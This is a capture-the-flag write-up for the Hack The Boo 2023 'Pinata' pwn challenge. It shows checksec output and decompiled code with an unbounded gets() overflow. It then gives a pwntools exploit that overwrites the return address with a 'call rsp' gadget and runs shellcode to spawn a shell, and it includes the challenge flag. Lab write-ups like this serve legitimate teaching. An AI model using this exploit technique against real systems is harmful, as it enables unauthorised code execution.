# Hack The Boo 2023

## Pinata

> Rather than resorting to hitting the piñata, unleash the treasures inside by letting out your loudest scream! Give it your all, and the goodies shall be yours!
>
>  Author: N/A
>
> [`pwn_pinata.zip`](pwn_pinata.zip)

Tags: _pwn_

## Solution
For this challenge we get a executable. First up checking what security measurements are setup.

```bash
$ checksec pinata
[*] '/home/ctf/pinata'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

So no `PIE` and the stack is executable. This could allow injecting shellcode and running it from the stack. Next up we check the file with `Ghidra`. The main is fairly small, does the typical setup (disabling buffering on stdin and stdout) and printing a banner. Then the function `reader` is called that reads to a local buffer. Here we definitely have an buffer overflow where we can inject shellcode.

```c
undefined8 main(void)
{
  setup();
  banner();
  reader();
  write(1,&UNK_00498206,0x13);
  return 0;
}

int reader(UI *ui,UI_STRING *uis)
{
  char *pcVar1;
  char local_18 [16];
  
  pcVar1 = gets(local_18);
  return (int)pcVar1;
}
```

Next we search for fitting rop gadgets to reach our shellcode. We find a fitting `call rsp` at address `0x41830d`. Since PIE is disabled we can just use the address as is. With this we have everything together, we overflow the buffer, override the `return address` with our gadget and then write our shellcode.

```python
from pwn import *

context.arch = "amd64"

#p = remote("94.237.63.238", 31528)
p = process("./pinata")

payload = b'A' * 24
payload += p64(0x41830d)
payload += asm(shellcraft.sh())
p.sendlineafter(b">> ", payload)
p.interactive()
```

Running this will get us the flag.

```bash
$ python3 solve.py
[+] Opening connection to 83.136.253.102 on port 33530: Done
[*] Switching to interactive mode
$ ls
flag.txt
glibc
pinata
$ cat flag.txt
HTB{5t4t1c4lly_l1nk3d_jmp_r4x_sc}
$
```

Flag: `HTB{5t4t1c4lly_l1nk3d_jmp_r4x_sc}`